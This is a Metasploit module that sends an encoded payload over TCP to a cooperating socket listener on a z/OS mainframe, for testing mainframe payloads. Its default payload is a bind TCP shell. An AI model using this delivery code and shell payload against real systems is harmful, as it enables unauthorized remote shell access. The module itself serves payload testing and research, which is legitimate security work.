##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  Rank = ManualRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info, {
      'Name'           => 'Exploit for Mainframe Payload Testing',
      'Description'    => %q{
        This module expects a simple socket listener on Mainframe/SystemZ which accepts a buffer < 3000 bytes.
        Once the payload is transferred, the host pogram must jump execution to the first byte.
      },
      'Author'         => [ 'Bigendian Smalls', ],
      'Arch'           => ARCH_ZARCH,
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          # There is no CVE for this vulnerability
          [ 'NA', 'n/a' ],
        ],
      'Privileged'     => false,
#      'Payload'        =>
#       {
#         'Space'    => 3000,
#     e },
      'Platform'       => 'mainframe',
      'Targets'        =>
        [
          [ 'auto',{} ],
#          Tested on Z/os 2.1 OS/390 XXXXXXX 24.00 04 1090
#         [ 'z/OS 2.1',{} ],
#         # Tested on Z/os 1.13 OS/390 XXXXXXX 23.00 03 1090
#         [ 'z/OS 1.13',{} ],
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Sep 11 2015',
      'Default.options' => { 'PAYLOAD' => 'mainframe/shell_bind_tcp' },
      'DisableNops'     => true,
    }))

    register_options([Opt::RPORT(12346)], self.class)
    deregister_options('SSL','SSLVersion','SSLVerifyMode','SSLCipher')
  end

# def on_new_session(client)
#   client.shell_command_token("ls -al ./")
# end

  def exploit
    connect

    # send plain payload
    buf = payload.encoded

    #print_status("payload space #{payload_space()}...")
    print_status("payload len #{payload.encoded.length}...")
    print_status("total buf len #{buf.length}...")
#   print_status("Trying target #{target.name}...")

    sock.put(buf)

    #cleanup
    handler
    disconnect
  end
end
